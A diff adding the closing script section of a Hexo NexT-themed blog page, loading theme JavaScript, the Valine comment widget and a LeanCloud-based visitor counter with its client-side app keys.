+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
+        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
+        placeholder: '说点什么...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
